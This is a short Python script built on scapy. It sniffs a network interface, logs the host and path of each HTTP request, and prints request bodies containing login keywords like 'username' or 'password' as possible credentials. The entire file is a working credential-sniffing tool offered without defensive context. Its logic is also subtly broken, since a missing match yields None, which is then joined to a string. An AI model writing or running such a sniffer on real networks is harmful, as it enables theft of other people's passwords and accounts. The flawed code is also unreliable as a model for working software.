#!/usr/bin/env python

import scapy.layers.l2 as scapy
import scapy.sendrecv
import scapy.layers.http as http
from scapy.packet import Raw


def sniff(interface):
    print("[+] Sniffing packet...\n\n")
    scapy.sendrecv.sniff(iface=interface, store=False, prn=sniffed_packet_processing)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(Raw):
        try:
            load = packet[Raw].load.decode()
            keywords = ["uname", "username", "user", "login", "password", "pass", "pw", "pword"]
            for keyword in keywords:
                if keyword in load:
                    return load
        except UnicodeDecodeError:
            pass

        print(packet.show())


def sniffed_packet_processing(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode())

        login_info = get_login_info(packet)
        if packet.haslayer(Raw):
            print("\n\n[+] Possible username/password >" + login_info + "\n\n")


